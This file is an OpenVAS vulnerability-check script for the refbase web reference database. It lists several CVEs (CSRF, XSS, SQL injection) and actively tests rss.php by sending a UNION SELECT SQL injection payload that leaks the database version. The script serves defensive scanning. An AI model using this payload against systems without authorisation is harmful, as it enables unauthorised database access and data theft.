###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_refbase_mult_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Web Reference Database Multiple Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:refbase:refbase";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806062");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2015-6007", "CVE-2015-6008", "CVE-2015-6009", "CVE-2015-6010",
                "CVE-2015-6011", "CVE-2015-6012", "CVE-2015-7381", "CVE-2015-7382",
                "CVE-2015-7383");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-10-05 13:23:43 +0530 (Mon, 05 Oct 2015)");
  script_tag(name:"qod_type", value:"remote_active");
  script_name("Web Reference Database Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with Reference
  Database and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - The application does not employ cross-site request forgery protection (CSRF)
    mechanisms, such as CSRF tokens.

  - Insufficient sanitization of user supplied input via referrer GET parameter
    by multiple pages.

  - Insufficient sanitization of user supplied via id GET parameter in unapi.php
    and stylesheet GET parameter in sru.php file.

  - Multiple input sanitization errors in install.php file via defaultCharacterSet,
    adminPassword, pathToMYSQL and databaseStructureFile POST parameters.

  - Insufficient sanitization of user supplied input via errorNo and errorMsg
    GET parameters in error.php file.

  - Insufficient sanitization of user supplied input via viewType GET parameter
    in duplicate_manager.php.

  - Insufficient sanitization of user supplied input via where GET parameter in
    rss.php file.

  - Insufficient sanitization of user supplied input via sqlQuery GET parameter
    in search.php file.

  - Insufficient sanitization of user supplied input via sourceText and sourceIDs
    POST variables in import.php file.

  - Insufficient sanitization of user supplied input via adminUserName POST
    parameter in update.php.

  - Insufficient sanitization of user supplied input via typeName and fileName
    POST parameters in modify.php file.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to submit valid requests to the server on behalf of authenticated
  users, execute arbitrary code on the server, directly read, write, and modify
  arbitrary data in the application's database, redirect victims to malicious
  web addresses.");

  script_tag(name:"affected", value:"refbase versions 0.9.6 and possibly earlier");

  script_tag(name:"solution", value:"As a workaround restrict access to the
  application to trusted users and networks and manually remove install.php
  and update.php scripts from production deployments of the application
  when they are not needed.");

  script_tag(name:"solution_type", value:"Workaround");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/374092");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38292");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_refbase_detect.nasl");
  script_mandatory_keys("Refbase/Installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.refbase.net/index.php/Web_Reference_Database");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!refPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:refPort)){
  exit(0);
}

url = dir + "/rss.php?where=%27nonexistent%27+union+all(select+1,2,3,4,5,6,"+
            "7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,"+
            "29,30,31,32,concat(%27version:%27,%27You%20have%20an%20error%20"+
            "in%20your%20sql%20syntax%27,@@version,%27%27,%27SQL-INJECTION-"+
            "TEST%27),34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50)--%20-";

sndReq = http_get(item:url, port:refPort);
rcvRes = http_keepalive_send_recv(port:refPort, data:sndReq);

if(rcvRes =~ "HTTP/1.1 302")
{
  Location = eregmatch( pattern:"Location: ([0-9a-zA-Z.?=&%_-]+)", string:rcvRes );
  url = "/" + Location[1];

  if(!Location[1]){
    exit(0);
  }

  if(http_vuln_check(port:refPort, url:url, check_header:FALSE,
                     pattern:"You have an error in your sql syntax",
                     extra_check:make_list("SQL-INJECTION-TEST", "refbase")))
  {
    report = report_vuln_url( port:refPort, url:url );
    security_message(port:refPort, data:report);
    exit(0);
  }
}
